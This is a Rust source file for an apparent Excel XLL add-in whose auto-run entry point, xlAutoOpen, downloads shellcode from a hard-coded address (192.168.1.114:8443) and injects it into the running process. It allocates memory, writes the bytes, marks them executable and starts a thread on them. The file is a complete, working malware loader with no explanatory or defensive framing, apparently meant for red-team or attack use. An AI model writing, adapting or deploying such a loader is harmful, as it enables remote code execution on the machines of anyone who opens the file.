use std::ptr;
use windows::{
    Win32::{
        Foundation::{
            CloseHandle,
            GetLastError,
            HANDLE,
            WIN32_ERROR
        },
        System::{
            Memory::{
                VirtualAllocEx, 
                VirtualProtectEx,
                MEM_COMMIT,
                MEM_RESERVE,
                PAGE_PROTECTION_FLAGS,
                PAGE_READWRITE,
                PAGE_EXECUTE_READ,
            },
            WindowsProgramming::INFINITE,
            Threading::{
                // OpenProcess,
                CreateRemoteThread,
                // GetCurrentProcessId,
                GetCurrentProcess,
                // PROCESS_ALL_ACCESS,
                WaitForSingleObject
            }
        },
    },
    Win32::System::Diagnostics::Debug::WriteProcessMemory,
};
use reqwest::get;

// CONSTANTS
// Define url here
const URL: &str = "http://192.168.1.114:8443/foo";

async fn inject(sc: Vec<u8>) {
    unsafe {
        let h: HANDLE = GetCurrentProcess();
            let sc_len = sc.len();
            
            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            
            let mut n = 0;
            WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));

            let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
            VirtualProtectEx(
                h,
                addr,
                sc_len,
                PAGE_EXECUTE_READ,
                &mut old_protect
            );

            
            let h_thread = CreateRemoteThread(
                h, 
                None, 
                0, 
                Some(std::mem::transmute(addr)), 
                None,
                0, 
                None
            )
            .unwrap();
            
            
            CloseHandle(h);
       
    }
}

async fn get_inject_shellcode(url: &str) {
    if let Ok(res) = get(url).await {
        if res.status().is_success() {
            let sc: Vec<u8> = res.bytes().await.unwrap().to_vec();
            inject(sc).await;
        }
    }
}

#[tokio::main]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
async extern "system" fn xlAutoOpen() {
    get_inject_shellcode(URL).await;
        
}
